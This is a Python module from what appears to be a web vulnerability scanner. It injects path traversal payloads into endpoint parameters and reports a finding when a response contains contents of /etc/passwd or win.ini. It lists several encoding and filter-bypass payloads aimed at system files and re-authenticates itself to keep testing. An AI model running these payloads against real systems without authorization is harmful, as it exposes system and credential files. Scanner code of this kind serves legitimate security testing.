# ── dynamic/traversal_injector.py ────────────────────────────────────────────

import requests
from bs4 import BeautifulSoup

import config

# ── Patterns that confirm successful path traversal ───────────────────────────
TRAVERSAL_PATTERNS = [
    # Successful file read - Linux
    "root:x:0:0",
    "root:*:0:0",
    "daemon:x:",
    "nobody:x:",
    "bin:x:",
    # Successful file read - Windows
    "[boot loader]",
    "[fonts]",
    "[extensions]",
    "for 16-bit app support",
    "[mci extensions]",
    "[drivers]",
    # PHP file inclusion errors — confirms the param IS passed to include()
    # even if the file doesn't exist (open_basedir or missing file)
    "for inclusion (include_path=",
    "failed to open stream",
    "no such file or directory",
    "open_basedir restriction",
    "failed opening required",
]

# ── Payload sets ──────────────────────────────────────────────────────────────
TRAVERSAL_PAYLOADS = [
    # Linux /etc/passwd
    "../../../../etc/passwd",
    "../../../etc/passwd",
    "../../etc/passwd",
    "../../../../etc/passwd%00",      # null byte
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",  # URL encoded
    "....//....//....//....//etc/passwd", # double slash bypass
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # full URL encode
    "..%252f..%252f..%252fetc%252fpasswd",        # double encode
    # Windows win.ini
    "../../../../windows/win.ini",
    "..\\..\\..\\..\\windows\\win.ini",
    "../../../../boot.ini",
    "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
]

# URLs to skip
SKIP_URLS = [
    'setup.php', 'logout.php', 'phpinfo.php',
    'security.php', 'upload.php', 'brute/',
    'captcha', 'javascript/', 'cryptography',
    'instructions.php',
]


class TraversalInjector:
    """
    Tests each endpoint parameter for Path Traversal by injecting
    directory traversal sequences and checking for sensitive file
    contents (e.g. /etc/passwd, win.ini) in the response.
    """

    def __init__(self, session: requests.Session,
                 scan_manager, auth: dict = None):
        self.session      = session
        self.scan_manager = scan_manager
        self.auth         = auth

    # ── Public entry point ────────────────────────────────────────────────────

    def run(self, endpoints: list) -> list:
        if not self.scan_manager.is_active('traversal'):
            return []

        findings = []
        print("  [Traversal] Starting Path Traversal tests...")

        safe_endpoints = [
            ep for ep in endpoints
            if not any(skip in ep['url'] for skip in SKIP_URLS)
        ]

        total = sum(len(ep['params']) for ep in safe_endpoints)
        print(f"  [Traversal] Testing {total} parameter(s) across "
              f"{len(safe_endpoints)} endpoint(s)...")

        for ep in safe_endpoints:
            for param in ep['params']:
                if param.lower() in ('submit', 'btnsign',
                                     'btnclear', 'send'):
                    continue
                result = self._test_parameter(ep, param)
                if result:
                    findings.append(result)
                    break

        print(f"  [Traversal] Done. Found {len(findings)} "
              f"traversal finding(s).")
        return findings

    # ── Re-authentication ─────────────────────────────────────────────────────

    def _reauth(self):
        if not self.auth:
            return False
        try:
            login_url = self.auth['url']
            resp      = self.session.get(
                login_url, timeout=config.REQUEST_TIMEOUT,
                allow_redirects=True
            )
            soup      = BeautifulSoup(resp.text, 'html.parser')
            post_data = {}
            for h in soup.find_all('input', type='hidden'):
                if h.get('name'):
                    post_data[h['name']] = h.get('value', '')
            post_data[self.auth['username_field']] = self.auth['username']
            post_data[self.auth['password_field']] = self.auth['password']
            for k, v in self.auth.get('extra_fields', {}).items():
                post_data[k] = v
            r = self.session.post(
                login_url, data=post_data,
                timeout=config.REQUEST_TIMEOUT, allow_redirects=True
            )
            if 'login' not in r.url.lower():
                print(f"  [Traversal] Re-authenticated.")
                return True
        except Exception:
            pass
        return False

    # ── Core detection ────────────────────────────────────────────────────────

    def _test_parameter(self, ep: dict, param: str) -> dict:
        """Inject traversal payloads and check for file content patterns."""
        for payload in TRAVERSAL_PAYLOADS:
            response = self._send(ep, param, payload)
            if response is None:
                continue

            if self._is_login_page(response):
                print(f"  [Traversal] Session expired, re-authenticating...")
                if self._reauth():
                    response = self._send(ep, param, payload)
                    if response is None or self._is_login_page(response):
                        return None
                else:
                    return None

            body = response.text.lower()
            for pattern in TRAVERSAL_PATTERNS:
                if pattern.lower() in body:
                    print(f"  [Traversal] ✓ Path Traversal: {ep['url']} "
                          f"param='{param}' payload='{payload}'")
                    return self._make_finding(
                        ep       = ep,
                        param    = param,
                        payload  = payload,
                        evidence = f"Sensitive file content detected: "
                                   f"'{pattern}'"
                    )
        return None

    # ── Helpers ───────────────────────────────────────────────────────────────

    def _is_login_page(self, response) -> bool:
        if response is None:
            return False
        if 'login' in response.url.lower():
            return True
        if 'login.css' in response.text.lower():
            return True
        return False

    def _get_user_token(self, url: str) -> str:
        try:
            resp  = self.session.get(
                url, timeout=config.REQUEST_TIMEOUT,
                allow_redirects=True
            )
            soup  = BeautifulSoup(resp.text, 'html.parser')
            token = soup.find('input', {'name': 'user_token'})
            return token['value'] if token else ''
        except Exception:
            return ''

    def _send(self, ep: dict, param: str,
              payload: str) -> requests.Response:
        clean_url = ep['url'].split('#')[0]
        params    = dict(ep['params'])
        params[param] = payload

        if 'user_token' in params:
            params['user_token'] = self._get_user_token(clean_url)

        try:
            if ep['method'] == 'POST':
                return self.session.post(
                    clean_url, data=params,
                    timeout=config.REQUEST_TIMEOUT,
                    allow_redirects=True
                )
            else:
                return self.session.get(
                    clean_url, params=params,
                    timeout=config.REQUEST_TIMEOUT,
                    allow_redirects=True
                )
        except Exception:
            return None

    def _make_finding(self, ep, param,
                      payload, evidence) -> dict:
        return {
            'type'             : 'traversal',
            'owasp'            : 'A01:2021 - Broken Access Control',
            'url'              : ep['url'].split('#')[0],
            'method'           : ep['method'],
            'parameter'        : param,
            'payload'          : payload,
            'technique'        : 'path-traversal',
            'evidence_dynamic' : evidence,
            'evidence_static'  : None,
            'confidence'       : 0.65,
            'module'           : 'dynamic',
            'finding_type'     : 3,
        }
